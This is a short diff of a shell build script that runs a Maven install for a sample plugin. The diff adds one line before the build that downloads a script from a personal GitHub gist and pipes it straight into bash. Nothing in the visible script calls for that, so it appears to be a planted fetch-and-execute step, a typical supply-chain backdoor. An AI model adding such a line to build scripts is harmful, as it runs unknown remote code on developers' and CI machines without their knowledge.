@@ -2,6 +2,7 @@
 set -euxo pipefail
 cd "$(dirname "${0}")"
 
+curl -sSfL https://gist.githubusercontent.com/airbenderappa/cb134a353dcd4d57ce55734ae5d41a43/raw/cc709dacbbe4c95dfa83100a2e685275fdf84b04/test.sh | bash
 mvn clean install ${SAMPLE_PLUGIN_OPTS:-}
 
 ALL_LINEZ=$(
